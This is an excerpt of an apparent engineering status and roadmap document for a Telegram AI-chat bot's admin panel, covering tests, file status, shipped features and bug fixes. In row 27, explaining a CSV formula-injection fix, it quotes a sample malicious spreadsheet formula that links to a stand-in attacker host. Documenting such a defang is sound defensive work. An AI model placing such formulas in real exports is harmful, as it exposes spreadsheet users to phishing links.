│                                          #            NaN/Inf COST_MARKUP rejection,
│                                          #            non-finite/negative price → FALLBACK)
├── test_models_catalog_parse_price.py     # 24 cases (None/zero/positive accept, NaN/Inf/-x reject,
│                                          #            -0.0 still accepted as free signal)
├── test_rate_limit.py                     # 23 cases (token bucket + LRU + middleware +
                                           #            client_ip_for_rate_limit / TRUST_PROXY_HEADERS +
                                           #            login-throttle install/consume helpers)
├── test_redeem_handler.py                 # 19 cases (cmd_redeem usage / status branches,
│                                          #            ASCII-only Unicode-alnum rejection)
├── test_strings_overrides.py              # 19 cases (override cache replace/clear/copy,
│                                          #          t() resolution order, missing-key WARNING
│                                          #          one-shot suppression, iter_compiled_strings
│                                          #          determinism + ignores overrides)
├── test_bot_commands.py                   # 9 cases (PUBLIC/ADMIN scope shape, set_my_commands
│                                          #          per-admin scoping, swallowed-failure semantics)
├── test_hub_ux.py                         # 22 cases (6-button hub layout, hub_newchat wipes,
│                                          #          hub_memory opens settings, wallet redeem button,
│                                          #          waiting_gift_code FSM input handler,
│                                          #          _render_memory_screen exception tightening,
│                                          #          _edit_to_hub exception tightening,
│                                          #          shared _redeem_code_for_user helper status branches)
└── test_web_admin.py                      # 230 cases (cookie sign/verify, login, dashboard,
                                          #             promo + gift + user list/create/revoke,
                                          #             CSRF, flash cookies, adjust-form parser,
                                          #             credit/debit happy-path + edge cases,
                                          #             broadcast form parser, job lifecycle,
                                          #             detail page polling endpoint,
                                          #             transactions query parser + handler,
                                          #             active-days cap mirror test,
                                          #             login rate-limit + trust-proxy-headers)
```

CI runs the full suite on Python 3.11 + 3.12, plus an alembic
upgrade/downgrade roundtrip job and a docker-build smoke job. Every PR
must be green before merge.

**Rule:** never modify a test to make it pass. Fix the code or the
assumption.

---

## 10. Status of every file (post-cleanup)

| File | Status |
| --- | --- |
| `main.py` | Clean. Env-driven port, `build_fsm_storage` (Redis if `REDIS_URL` set, in-memory fallback with warning), `install_webhook_rate_limit`, admin router included BEFORE the public router. |
| `database.py` | Clean. All money-touching methods use `SELECT … FOR UPDATE`. `finalize_partial_payment` already uses `max(already_credited, actually_paid_usd)`. `admin_adjust_balance` writes `transactions` row + updates wallet in one tx with FOR UPDATE on the user row. Part-6 added `list_transactions(gateway, status, telegram_id, page, per_page)` with allow-listed enum filters (`TRANSACTIONS_GATEWAY_VALUES`, `TRANSACTIONS_STATUS_VALUES`) and `TRANSACTIONS_MAX_PER_PAGE=200`, plus `BROADCAST_ACTIVE_DAYS_MAX=36_500` defense-in-depth cap inside `iter_broadcast_recipients`. |
| `payments.py` | Clean. Two-pass IPN verifier (raw → canonical fallback). Idempotent finalize, partial-delta crediting. |
| `handlers.py` | Clean. `cmd_start`, `_route_legacy_text_to_hub`, `process_chat`, `process_promo_input`, and `process_custom_amount_input` all guard `from_user is None` and `text is None`. `_redeem_code_for_user` enforces ASCII-only `[A-Z0-9_-]` (matching the admin-side validators) so user-typed Unicode digits / homoglyphs return the clearer `redeem_bad_code` reply without a wasted DB round-trip. Both `_render_memory_screen` (Stage-9-Step-1.5) and `_edit_to_hub` (standalone bug-fix PR) wrap their `edit_text` calls in `except TelegramBadRequest:` only — the legitimate "message is not modified" no-op — so unrelated DB drops, `TelegramForbiddenError`, `TelegramRetryAfter`, and network blips propagate to logs / the dispatcher's error handler instead of getting silenced as a single `log.debug` line. |
| `web_admin.py` | aiohttp+jinja2 panel mounted under `/admin/`. HMAC-signed cookies (`ADMIN_PASSWORD` + `ADMIN_SESSION_SECRET`). Login + dashboard (Part-1). Promos page with CSRF tokens + flash banners (Part-2). Gift codes page (Part-3) with `parse_gift_form` + `EXPIRES_IN_DAYS_MAX` bound. Users page + credit/debit form (Part-4) with `parse_adjust_form`, `ADJUST_MAX_USD` bound, `ADMIN_WEB_SENTINEL_ID=0` audit attribution. Broadcast page (Part-5) with in-memory job registry (`APP_KEY_BROADCAST_JOBS` + `APP_KEY_BROADCAST_TASKS`), `asyncio.create_task` background worker, JSON polling endpoint, shares `admin._do_broadcast` via `progress_callback`; `BROADCAST_ACTIVE_DAYS_MAX` cap added in Part-6. Transactions browser (Part-6) with `parse_transactions_query` + `_encode_tx_query` helpers, paginated read against `Database.list_transactions`. Promo / gift code parsers + revoke handlers enforce ASCII-only `[A-Z0-9_-]` (`(c.isascii() and c.isalnum()) or c in "_-"`) so a Unicode digit / homoglyph in a code doesn't store a row no user can ever redeem. |
| `templates/admin/` | jinja2 templates. `base.html` = global CSS + `<head>`; `_layout.html` = sidebar shell (extended by content pages); `login.html`, `dashboard.html`, `promos.html`, `gifts.html`, `users.html`, `user_detail.html`, `broadcast.html`, `broadcast_detail.html`, `transactions.html`. |
| `ai_engine.py` | Clean. `aiohttp.ClientTimeout(total=60, connect=10, sock_read=50)` on OpenRouter. Defensive guard for malformed responses. |
| `pricing.py` | Clean. Conservative fallback for unmapped models, markup ≥ 1.0. `get_markup` rejects `NaN` / `±Infinity` `COST_MARKUP` env values via `math.isfinite`; `_apply_markup` substitutes `FALLBACK_PRICE` for any non-finite or negative `ModelPrice` field so paid models can't silently render free when the upstream catalog is corrupted. |
| `models_catalog.py` | Clean. `_parse_price` returns `None` for missing / malformed / `NaN` / `±Infinity` / negative prices so the catalog refresh drops models with corrupt pricing rather than minting a `ModelPrice` that poisons every cost calculation downstream. `-0.0` is still accepted as a legitimate free-tier price. |
| `rate_limit.py` | `consume_chat_token(user_id)` per-user (called *inside* `handlers.process_chat`, not as a `dp.message` middleware — see PR #47/#48 history). `webhook_rate_limit_middleware` per-IP — scoped to `WEBHOOK_PATH = "/nowpayments-webhook"` only (Part-5 bundled fix) so admin panel traffic doesn't eat the same bucket. Stage-9-Step-1 added `install_login_rate_limit` + `consume_login_token` for the admin-login throttle, plus `client_ip_for_rate_limit(request)` helper that reads `X-Forwarded-For` leftmost when `TRUST_PROXY_HEADERS=1` is set (defaults off; both webhook and login limiters share the helper). |
| `admin.py` | `parse_admin_user_ids`, `is_admin`, `_escape_md`, `/admin`, `/admin_metrics`, `/admin_balance`, `/admin_credit`, `/admin_debit`, `/admin_promo_create`, `/admin_promo_list`, `/admin_promo_revoke`, `/admin_broadcast`. Part-6 added `_BROADCAST_ACTIVE_DAYS_MAX=36_500` cap in `parse_broadcast_args`. `parse_promo_create_args` enforces ASCII-only `[A-Z0-9_-]` matching the web admin side. 93 unit tests. |
| `alembic/` | Clean. Baseline = consolidated current schema. `env.py` URL-encodes credentials. |
| `entrypoint.sh` | Idempotent `alembic upgrade head` then `exec python -m main`. |
| `docker-compose.yml` | postgres + redis + bot. |
| `strings.py` | Clean. Every `t()` slug exists in fa + en. |
| `.env.example` | Documents every required env var including `REDIS_URL`, `ADMIN_USER_IDS`, `COST_MARKUP`. |
| `tests/` | 286 cases. Strict-warnings pytest config + 3-job CI matrix. |
| ~~`schema.sql`, `migrations/*.sql`~~ | **Deleted in cleanup PR.** Alembic owns schema. |

---

#### Stage-15-Step-E #10b row 2: COST_MARKUP editor on /admin/monetization (queued 2026-05-02)

The global price multiplier `COST_MARKUP` (default 1.5×) used to be
env-only — an operator who wanted to retune it after a cost spike
or a competitor undercut had to redeploy the bot. This follow-up
applies the same DB-backed override pattern that landed in
Stage-15-Step-F follow-up #4 for the bot-health thresholds:
`system_settings` row keyed `COST_MARKUP`, in-process override
cache, web admin editor on `/admin/monetization`, and an audit row
that captures the old → new diff so an analyst can later answer
"did revenue jump because we changed pricing on Tuesday or because
traffic spiked".

The plumbing:

* `pricing.py` — module-level `_MARKUP_OVERRIDE: float | None`
  cache, public `set_markup_override`, `clear_markup_override`,
  `get_markup_override`, `refresh_markup_override_from_db`,
  `get_markup_source` helpers, and `_coerce_markup` validator.
  `get_markup()`'s resolution order is now: in-process override →
  env → 1.5 default. The override layer rejects non-finite,
  below-`MARKUP_MINIMUM=1.0`, at-or-above-`MARKUP_OVERRIDE_MAXIMUM=100.0`,
  and `bool` values defensively so a malformed DB row or fat-finger
  POST can't poison every paid request.

* `web_admin.py` — `monetization()` calls
  `refresh_markup_override_from_db` on every render so a tweak made
  in another replica is reflected in the panel. New
  `_build_markup_view()` helper produces the same "effective / db /
  env / default" breakdown the bot-health thresholds card uses on
  `/admin/control`. New `monetization_markup_post` handler does
  full validation, writes the row via `upsert_setting` (or
  `delete_setting` for blank fields = clear override), refreshes
  the cache, and records a `monetization_markup_update` audit row
  whose `meta` carries the diff. Route registered at
  `POST /admin/monetization/markup` with the operator floor
  (viewer-readonly callers see the form but can't submit) since a
  markup change directly changes how much every paying user is
  charged on their next prompt.

* `templates/admin/monetization.html` — new collapsible "Edit
  markup (operator+)" details element under the existing Pricing
  panel, rendering a 4-row table (DB override / env / compile-time
  default / effective) plus a number-input + Save button. Empty
  field = clear override.

* `main.py` — boot hook calls `pricing.refresh_markup_override_from_db`
  after the admin-toggle cache warm-up so the very first paid
  request sees the operator's configured markup rather than env /
  default. Also added the same hook for `bot_health.refresh_threshold_overrides_from_db`
  which had been missing since Stage-15-Step-F follow-up #4 — same
  shape, same fail-soft handling.

**Bundled bug fix.** Audit of `database.upsert_setting` while
writing the markup persistence path surfaced a real reach-able
crash: the method passed the raw key + value through to Postgres
without stripping `\x00` bytes. Postgres' UTF-8 codec rejects NUL
with `invalid byte sequence for encoding "UTF8": 0x00`, which would
crash the upsert and bubble back as a 500 on whichever admin form
initiated the write — the bot-health threshold form on
`/admin/control` (already shipped), the new markup form here, and
every future `system_settings`-backed editor. Every other free-form
admin write path (`upsert_string_override`, `set_admin_role` notes)
already strips NUL; the generic overlay was the lone holdout. With
the markup editor opening up a new reach-able path (a fat-finger
paste from a corrupted clipboard becomes a real risk), fixing it
now is the smallest change that closes the regression. Strip
silently rather than `ValueError`-ing — operators don't know what
NUL is, and the column is already validated for length and the
validators that wrap this method (`set_markup_override`,
`bot_health.set_threshold_override`) reject anything non-numeric so
NUL stripping cannot widen acceptance.

Files in this PR (Stage-15-Step-E #10b row 2):

* `pricing.py` — module-level override cache, public set/clear/
  snapshot helpers, async refresh-from-DB helper, `get_markup`
  resolution order update, `get_markup_source` helper.
* `web_admin.py` — `_build_markup_view`, `monetization()` refresh
  hook, `monetization_markup_post` handler, route wiring,
  `monetization_markup_update` audit slug + dropdown label,
  `_monetization_csrf_guard` helper.
* `templates/admin/monetization.html` — Edit-markup details panel.
* `main.py` — boot hooks for both `pricing.refresh_markup_override_from_db`
  and `bot_health.refresh_threshold_overrides_from_db`.
* `database.py` — `upsert_setting` NUL-strip bundled fix.
* `tests/test_pricing.py` — 21 new tests covering the override
  layer (set/clear semantics, validation rejects, source
  reporting, refresh-from-DB happy path, db-error path, none-db
  path, below-minimum rejection, end-to-end calculate_cost +
  apply_markup_to_price honouring the override), plus an autouse
  fixture that resets the module cache between tests.
* `tests/test_web_admin.py` — 8 new tests covering form render,
  auth gate, CSRF guard, happy-path POST + cache application,
  blank-clears-override, parametrised invalid-value rejection,
  above-maximum rejection, and DB-failure-keeps-previous-value.

---

## 10b. Admin-panel feature gap roadmap (added 2026-05-01)

User asked (2026-05-01) for a comprehensive audit of every
operator-controllable feature today gated by env vars / commands
/ DB-only state, with a target of "full access to change anything
from there [the web admin panel]". The audit below is a running
roadmap; mark rows as **shipped** + the PR number as each lands.
Items are in rough priority order — top items are highest-impact
or unblock other work.

| # | Gap | Today | Target panel surface | Priority | Status |
|---|-----|-------|----------------------|----------|--------|
| 1 | **OpenRouter API keys** — multi-key load balancer is configured by env (`OPENROUTER_API_KEY` comma-separated). | Read-only `/admin/openrouter-keys` shows usage. | New `/admin/openrouter-keys` add/remove/disable + per-key 24h usage / cost / 429-cooldown stats. Persist in DB (encrypted at rest). | P1 | **Shipped** (PR #156 for the DB-backed registry; PR #160 added 24h usage/cost; PR #165 added per-(key, model) cooldown viewer) |
| 2 | **`COST_MARKUP`** — global price multiplier. | Env-only, default 1.5×. | Editor on `/admin/monetization` with audit row + history table. | P1 | **Shipped** (this PR — editor + DB-backed override + audit row; history table is a separate row #12) |
| 3 | **Bot-health severity thresholds** (`BOT_HEALTH_*`). | Env-only. | Editor on `/admin/control` with effective/source columns. | P1 | **Shipped** (Stage-15-Step-F follow-up #4 — this PR) |
| 4 | **`MIN_TOPUP_USD` / `MIN_TOPUP_TOMAN`** — minimum allowed top-up amounts. | Env-only. | Editor on a new `/admin/wallet-config` page. | P2 | **Shipped** — PR-2a (PR #169) added the DB-backed override layer in `payments.py` + boot warm-up; PR-2b (this PR) added the `/admin/wallet-config` page with the MIN_TOPUP_USD editor, audit row (`wallet_config_min_topup_update`), 13 web tests, and sidebar nav link. `MIN_TOPUP_TOMAN` is not a separate knob — it's derived from MIN_TOPUP_USD × FX rate at request time, and the page renders that derived figure inline. |
| 5 | **`REQUIRED_CHANNEL`** — force-join channel handle. | Env-only. | Editor on `/admin/control` (or new `/admin/access`). | P2 | **Shipped** (this PR — DB-backed override layer in `force_join.py` + boot warm-up + `/admin/control` editor card with set / clear / force-OFF actions, audit row `control_required_channel_update`, sidebar source badge). |
| 6 | **`FREE_MESSAGES_PER_USER`** — initial free-trial messages. | Env-only. | Editor on `/admin/wallet-config`. | P2 | **Shipped** (this PR — DB-backed override layer in new `free_trial.py` + boot warm-up + `/admin/wallet-config` editor card with set / clear actions, audit row `wallet_config_free_messages_update`, source badge, `Database.create_user` now binds the resolved allowance to the `free_messages_left` parameter so a saved override applies to brand-new registrants without a process restart. Bounds `[0, 10_000]`; the explicit-zero "pay-to-play" path is allowed; existing users are unaffected — `ON CONFLICT (telegram_id) DO NOTHING`.) |
| 7 | **`REFERRAL_BONUS_PERCENT` + `REFERRAL_BONUS_MAX_USD`** — referral payouts. (Earlier drafts of this row called these `REFERRAL_BONUS_USD` / `REFERRAL_PERCENT`; the actual env-var names in `referral.py` are `REFERRAL_BONUS_PERCENT` and `REFERRAL_BONUS_MAX_USD`.) | Env-only. | Editor on `/admin/wallet-config`. | P2 | **Shipped** (this PR — DB-backed override layer in `referral.py` for both knobs + boot warm-up + `/admin/wallet-config` editor card with combined Save form / per-knob Clear form, audit row `wallet_config_referral_update`). |
| 8 | **`MEMORY_CONTEXT_LIMIT` / `MEMORY_CONTENT_MAX_CHARS`** — conversation memory caps. | Env-only. | Editor on a new `/admin/memory-config` page. | P3 | **Shipped** (this PR — DB-backed override layer in new `memory_config.py` + boot warm-up + `/admin/memory-config` page with two editor cards (context-limit `[1, 500]` and content-max-chars `[100, 100_000]`), each with set / clear actions, audit rows `memory_config_context_limit_update` / `memory_config_content_max_update`, source badges, sidebar nav link. `database.py` now calls `get_memory_context_limit()` / `get_memory_content_max_chars()` instead of hardcoded class attributes. Bundled bug fix: `get_full_conversation` now includes `image_data_uris` — vision turns surface a `[image]` marker in the `.txt` export instead of being silently dropped.) |
| 9 | **Pending-PENDING expiration window** (`PENDING_EXPIRATION_HOURS_DEFAULT`; the actual env-var name in `pending_expiration.py` is `PENDING_EXPIRATION_HOURS`). | Env-only. | Editor on `/admin/control` or `/admin/payments`. | P3 | **Shipped** (this PR — DB-backed override layer in `pending_expiration.py` + boot warm-up + `/admin/control` editor card with set / clear actions, audit row `control_expiration_hours_update`, source badge, audit `meta` carries `threshold_hours_used`). |
| 10 | **Stuck-PENDING alert threshold** (`PENDING_ALERT_THRESHOLD_HOURS`). | Env-only. | Editor on `/admin/control`. | P3 | **Shipped** (this PR — DB-backed override layer in `pending_alert.py` + boot warm-up + `/admin/control` editor card with set / clear actions, audit row `control_alert_threshold_update`, source badge, iteration-time re-read in `_alert_loop` so a saved override is live on the next tick). |
| 11 | **Per-loop cadence overrides** (`BOT_HEALTH_LOOP_STALE_<NAME>_SECONDS`). | Env-only. | Editor on `/admin/control` (one row per loop name). | P3 | **Shipped** (this PR — DB-backed `_LOOP_STALE_OVERRIDES` cache in `bot_health.py` + `refresh_loop_stale_overrides_from_db` + `_stale_threshold_seconds` consults DB before env, panel `_build_loop_stale_view` per-loop card with cadence / cadence-derived / env / DB / effective / source columns + per-row Save/Clear forms, `control_loop_stale_post` validates against `metrics._LOOP_METRIC_NAMES` so a typo can't write a row no real loop reads, audit slug `control_loop_stale_update`, boot warm-up in `main.py`. **Bundled bug fix:** `refresh_threshold_overrides_from_db` previously raised `AttributeError` on a non-string-non-None row in `system_settings` (e.g. an int from a future schema change), poisoning the whole load and reverting every other override; the refresh now coerces via `_coerce_setting_to_str` so a single garbage row only drops itself.) |
| 12 | **`COST_MARKUP` history & analytics** — operator can see when markup last changed and the impact on revenue. | Not tracked. | Markup-history table + revenue-attribution chart on `/admin/monetization`. | P2 | **Shipped** (this PR — `Database.list_markup_history` reads `monetization_markup_update` rows from `admin_audit_log` and decodes the `meta` JSONB into typed `before` / `after` / `before_source` / `after_source` / `kind` fields; `Database.get_markup_eras` derives per-era revenue attribution by bucketing `usage_logs.cost_deducted_usd` between consecutive markup changes (so changing `1.5×` → `2.0×` and back tells you honestly which era was more profitable instead of applying today's markup to historical rows); two new cards on `/admin/monetization` — "Markup eras — revenue attribution" and "Markup change history" — both fail-soft to empty placeholder text on a DB blip rather than 500-ing the page. **Bundled bug fix:** added `_finite_float_or_none` helper that explicitly rejects `bool` (a `True` value sneaking through as `1.0` would silently corrupt the markup column in audit-log meta) and treats `NaN` / `±Inf` as `None` rather than letting them propagate into the per-era SQL where they'd render as `nan×`. Defence-in-depth: `get_markup_eras` clamps a tampered `markup=0` audit row to `openrouter_cost_usd=0` rather than dividing by zero.) |
| 13 | **Per-user revenue contribution panel** — top spenders. | Existed in `get_monetization_summary` aggregates but not surfaced. | New "Top users" tab on `/admin/monetization`. | P2 | **Shipped** (PR #166) |
| 14 | **Disable individual gateways** (NowPayments / TetraPay / Zarinpal). | DB row in `disabled_gateways` (already wired via `/admin/gateways`). | Per-crypto toggles + provider master switch + Zarinpal panel row. | P3 | **Shipped** (this PR — `_GATEWAY_PROVIDER_LIST` master-switch section at the top of `/admin/gateways` exposes `nowpayments` so the operator can flip the entire crypto pool off in one click without overwriting the per-currency disable state — re-enabling the master restores the previous picker layout. `_GATEWAY_CARD_LIST` now includes `zarinpal` (the hot-path picker in `handlers.py` already honoured `is_gateway_disabled("zarinpal")` via Stage-15-Step-E #8 follow-up #1; the panel just had no row for it). `handlers._active_pay_currencies` short-circuits to `[]` when `is_gateway_disabled("nowpayments")` so the picker keyboard hides every crypto button at render time. `process_custom_currency_selection` adds a defense-in-depth check so a stale rendered keyboard can't sneak a `cur_<crypto>` callback past the master switch (card gateways `cur_tetrapay` / `cur_zarinpal` are intentionally NOT covered by the master — they have their own per-gateway toggles). The disabled-master crypto section on the panel surfaces a banner explaining the per-currency toggles below are sticky-on under the master while the master is off. **Bundled bug fix:** the gateway-toggle POST handler previously took whatever `gateway_key` came in on the form body verbatim, so a tampered POST or a future client-side bug could write an unknown / mistyped / uppercase key (e.g. `"BTC"` or `"bitcoin"`) into `disabled_gateways` where nothing in the hot-path's lowercase ticker check would ever match it — silently a no-op. Now we validate against the canonical `_GATEWAY_ALLOWED_KEYS` allowlist (built from the union of the three constants at module load) and reject unknown keys with a flash error, skipping the DB write entirely. Tests pin every canonical key as POST-able plus a representative slice of bogus keys as rejected, AND pin the allowlist === advertised-list invariant so a future refactor can't desync the panel from the validator.) |
| 15 | **OpenRouter rate-limit per (key, model)** — currently per-key only. | Code path exists in `openrouter_keys.py`. | Per-(key, model) cooldown viewer on `/admin/openrouter-keys`. | P3 | **Shipped** (PR #165) |
| 16 | **Conversation-export pagination** — `/conversation_export` cmd dumps full history; large convos OOM. | One-shot dump. | Multi-part export with offset cursor on `/admin/users/<id>/conversations`. | P3 | **Shipped** (this PR — new `/admin/users/<telegram_id>/conversations` hub page renders one row per `.txt` part with kept-count, byte-count, canonical filename and a download button; sibling `/admin/users/<telegram_id>/conversations.txt?part=N` streams a specific part with `Content-Disposition: attachment` and the conventional `meowassist-history-<id>-<date>-part-<N>-of-<M>.txt` filename. Both routes are viewer-readable (same role floor as `/usage` / `/stats`). Per-part download writes one `admin_conversation_export` audit row with `telegram_id`, `part_index`, `total_parts`, `kept_in_part`, `total_kept`, `bytes`. Re-uses the existing `format_history_as_text_multipart` renderer (the user-side `/history` command also calls it) so the bot side and admin side cannot drift on header shape, trim semantics, or filename. Link added on `/admin/users/<id>` next to "Spending stats →" and a card on `/admin/exports` pointing operators to the user list. **Bundled bug fix:** `format_history_as_text_multipart` previously called `datetime.now(timezone.utc)` once *per part* inside `_build_header_lines`, so a multi-part export rendered across a second boundary minted different `Exported:` timestamps on each part of the *same* export. Now the function captures one `now` at entry and threads it through every `_build_part_text` call (also exposed as a public `now=` kwarg so tests can pin the stamp deterministically). Naive `datetime` inputs are coerced to UTC; aware non-UTC inputs are converted to UTC. 18 new tests, total suite passes (3734 passed, 9 skipped).) |
| 17 | **Stats bucketing** (weekly/monthly) — only daily today. | `get_user_daily_spending` only. | New `bucket=` param + buttons on `/admin/users/<id>/stats`. | P3 | **Shipped** (this PR — new `bucket` parameter on `Database.get_user_daily_spending` supporting `day`/`week`/`month` via `date_trunc`. New `/admin/users/{id}/stats` page with bucket selector buttons, aggregate tiles, and spending-series table with inline bars. Link from user-detail page. Bundled bug fix: `get_user_admin_summary` now scrubs NaN/Inf from `total_credited_usd` / `total_spent_usd` — pre-fix `float(credited or 0)` passed `Decimal('NaN')` through because NaN is truthy in Python. 22 new tests. Total suite: 3565 passing.) |
| 18 | **JSONB conversation_messages** — vision turns can't store image refs. | `content TEXT` only. | Schema migration to JSONB + read/write paths preserve attachments. | P2 | **Shipped** (PR #163) |
| 19 | **"View as <role>" toggle** — operators can preview viewer/operator views. | None. | Top-bar dropdown on `/admin` that swaps the active role for the current request only. | P3 | **Shipped** (PR #162) |
| 20 | **Audit retention policy** — audit log grows forever. | No retention. | Editor on `/admin/audit` + nightly delete loop. | P2 | **Shipped** (this PR — DB-backed override layer in new `audit_retention.py` for `AUDIT_RETENTION_DAYS` + background reaper loop that batch-deletes `admin_audit_log` rows older than the retention window (default 90 days, range [7, 3650]). Retention editor card on `/admin/audit` with breakdown table + set/clear form, audit slug `audit_retention_update`. Boot warm-up in `main.py`. Env vars `AUDIT_RETENTION_DAYS`, `AUDIT_RETENTION_INTERVAL_HOURS`, `AUDIT_RETENTION_BATCH` documented in `.env.example`. Bundled bug fix: `list_admin_audit_log` now caps `limit` to 10 000 — previously unbounded, a future caller could OOM the web worker by pulling every audit row.) |
| 21 | **Bot-health alert cadence** — `BOT_HEALTH_ALERT_INTERVAL_SECONDS`. | Env-only. | Editor on `/admin/control`. | P3 | **Shipped** (PR #173) |
| 22 | **`I18N_LOCK`** — gate live string overrides during deploy. | Not implemented. | Toggle on `/admin/strings` that blocks the upsert form. | P3 | **Shipped** (this PR — new `i18n_lock.py` module with DB-backed boolean override for `I18N_LOCK`. Toggle banner on `/admin/strings` (lock / unlock / clear-DB-override buttons, `ROLE_SUPER`-gated). Save and revert handlers on `/admin/strings/{lang}/{key}` and `/revert` refuse with a flash error and audit slug `string_save_blocked_locked` / `string_revert_blocked_locked` while locked. Detail-form template shows a lock notice + disables the save / revert buttons. Boot warm-up in `main.py` so the toggle's effect lands without a restart. Env var `I18N_LOCK` documented in `.env.example`. Bundled bug fix: `templates/admin/string_detail.html` previously nested the revert `<form>` inside the save `<form>`, which violates HTML5's form-content model — the inner `<form>` start tag was dropped by the browser parser, so clicking "Revert to default" submitted the SAVE endpoint with the textarea contents instead of `/revert`. The two forms are now siblings; each button hits the action it advertises.) |
| 23 | **`MODEL_DISCOVERY_INTERVAL_SECONDS`** — catalog refresh cadence. | Env-only. | Editor on a new `/admin/models-config` page. | P3 | **Shipped** (this PR — new `model_discovery_config.py` module with DB-backed override for `DISCOVERY_INTERVAL_SECONDS`. New `/admin/models-config` page with sidebar link + discovery interval editor (breakdown table + set/clear form). Boot warm-up in `main.py`. Discovery loop re-reads DB-backed interval every tick. Audit slug `models_config_discovery_interval_update`. Bundled bug fix: `delete_setting` now strips NUL bytes from the key, mirroring `upsert_setting`.) |
| 24 | **`FX_REFRESH_INTERVAL_SECONDS`** — USD→Toman refresh cadence. | Env-only. | Editor on `/admin/wallet-config`. | P3 | **Shipped** (this PR — new `fx_refresh_config.py` module with DB-backed override + boot warm-up. Editor card on `/admin/wallet-config` with breakdown (effective / db / env / default) and set/clear form. FX refresher loop re-reads the DB-backed interval every tick so a saved override is live without a redeploy. Audit slug `wallet_config_fx_refresh_update`. Bundled bug fix: new `fx_rates._sync_registered_cadence` helper pushes the resolved cadence into `bot_health.LOOP_CADENCES` at loop start and after every tick; pre-fix, an operator who set `FX_REFRESH_INTERVAL_SECONDS` to anything other than the 600 s compile-time default saw the `/admin/control` panel continuously flag `fx_refresh` as overdue because the panel's stale-threshold formula `2 × cadence + 60` used the registered 600 s rather than the resolved value. Mirrors the row-21 bot-health-alert fix.) |
| 25 | **`ADMIN_PASSWORD`** rotation — currently env-only. | Env-only. | "Rotate password" form on `/admin` profile page. | P2 | **Shipped** (this PR — new `admin_password.py` module: scrypt-hashed password (n=2^15, r=8, p=1) stored in `system_settings.ADMIN_PASSWORD_HASH`, DB-backed override slot mirroring rows 4/6/8/20/21/23/24, login flow prefers DB hash → env back-compat → "deploy is misconfigured" refusal. New `/admin/profile` page with sidebar link, "current credential" provenance breakdown (db / env / unset), and password-rotation form (current + new + confirm) gated to `ROLE_SUPER`. Strength gate: ≥12 chars, must include letter + digit/symbol, refuses whitespace-only / unchanged. Boot warm-up in `main.py`; per-request refresh on login + on /admin/profile render. Audit slugs `profile_view`, `admin_password_rotated`, `admin_password_rotation_failed`. Bundled bug fix: `/admin/logout` now sweeps `meow_admin_view_as` AND `meow_flash` cookies in addition to the session cookie — previously a shared workstation leaked the prior operator's "viewing as <role>" preview into the next person's session.) |
| 26 | **`ADMIN_2FA_ENROLLMENT_TIMEOUT`** — TOTP enrollment window. | Env-only. | Editor on the existing `/admin/enroll_2fa` page. | P3 | **Shipped** (this PR — new `enrollment_timeout.py` module with DB-backed override for `ADMIN_2FA_ENROLLMENT_TIMEOUT`. Editor card on `/admin/enroll_2fa` with breakdown table (effective / db / env / default), set / clear form, source badge. Suggested-secret mode renders a JavaScript countdown that auto-reloads when the window expires so an abandoned browser tab doesn't leak the secret indefinitely. Default 300 s (5 min), range [30, 3600]. Boot warm-up in `main.py`. Audit slug `enroll_2fa_timeout_update`. Env var documented in `.env.example`. Bundled bug fix: `memory_config_get` used the undefined `get_flash(request)` instead of `pop_flash(request, response)` — saving a memory-config override and landing back on `/admin/memory-config` would 500 with `NameError`.) |
| 27 | **CSV export bulk download** — full transactions / usage history. | Per-user only. | Top-level `/admin/exports` page that streams big CSVs. | P3 | **Shipped — PR #188** (`/admin/exports` hub page links the existing transactions / monetization CSVs and exposes two new system-wide streaming endpoints: `/admin/exports/usage.csv` (every `usage_logs` row across every user, since/until/limit filters) and `/admin/exports/audit.csv` (every `admin_audit_log` row, action/actor/since/until/limit filters). Both stream via keyset-paginated async generators in batches of 5 k rows, capped at 1 M usage rows / 100 k audit rows, audit-logged under new `system_usage_export_csv` / `admin_audit_export_csv` slugs. Bundled bug fix: CSV-formula-injection defang (CWE-1236) latent since Stage-9 transactions CSV — `_csv_quote` now TAB-prepends any field whose first char is `=`, `+`, `@`, `\t`, `\r` so a malicious refund-reason like `=HYPERLINK("https://attacker", "click me")` can't execute when the CSV is opened in Excel / LibreOffice / Numbers / Sheets; negatives intentionally not defanged to keep accounting CSVs intact). |
| 28 | **Refund presets** — predefined refund reasons / amounts. | Free-form text only. | Dropdown of presets + amount on `/admin/users/<id>/refund`. | P3 | **Shipped — PR #187** (operator-curated reason list, `/admin/refund-presets` editor + dropdown above the `/admin/transactions` refund form; bundled bug fix: `_scrub_audit_meta` keeps `record_admin_audit` / `record_payment_status_transition` lossless across `Decimal` / `datetime` / NaN / Infinity meta values that previously silently dropped audit rows). Per-preset amount field deferred — current refund form refunds full credited amount, ~95% of refunds want that. |
| 29 | **Promo / gift code edit** — currently create-and-revoke, no edit. | None. | Inline edit on `/admin/promos` + `/admin/gifts`. | P3 | Pending |
| 30 | **Disable individual models per-gateway** — e.g. block GPT-4o on Zarinpal-funded wallets. | None. | New cross-table on `/admin/models`. | P4 | Pending |

Constraints / non-goals (called out so the next AI doesn't waste
a slot):

- **Stripe / international card** — operator is in Iran, can't
  complete Stripe KYC. Not in scope. (Same as Step-E #8.)
- **PDF export** — not a roadmap item; CSV is sufficient.
- **Image graphs** — D3 / chart-js dependency not yet in deps.
  Roadmap item only if the operator asks for it.
- **Multi-bot routing** — out of scope; this is a single-bot deploy.
- **Break-even analysis chart** — needs a new schema (running OR
  cost vs. running revenue); P3, deferred.

Each shipped row should also link the PR # so the audit table is
the single source of truth for "what's wired up where".

---

### §10b.1 — Row #4 (MIN_TOPUP_USD web surface) — shipped

**Context (closed 2026-05-02):** PR-2a (PR #169) shipped the override
layer in `payments.py` (mirrors the COST_MARKUP pattern in `pricing.py`)
plus the boot-time cache warm in `main.py` and the handler-side
integration so every paid path now resolves the floor through
`get_min_topup_usd()` instead of reading `GLOBAL_MIN_TOPUP_USD`
directly. **The Telegram side is fully wired** — once an operator
upserts `system_settings.MIN_TOPUP_USD` (via psql, for example),
the new floor is in effect after one bot restart (or sooner if
the next admin page render calls `refresh_min_topup_override_from_db`).

**PR-2b shipped** — the `/admin/wallet-config` page is now live:

- `_build_min_topup_view(toman_per_usd)` helper in `web_admin.py`
  mirrors `_build_markup_view`.
- `wallet_config_get` (`/admin/wallet-config`, viewer-readable) and
  `wallet_config_min_topup_post` (`/admin/wallet-config/min-topup`,
  operator-floored) handlers.
- `_wallet_config_csrf_guard` mirrors `_monetization_csrf_guard`,
  redirecting to `/admin/wallet-config` on CSRF mismatch.
- New `templates/admin/wallet_config.html` with the same
  effective/db/env/default breakdown the COST_MARKUP editor uses,
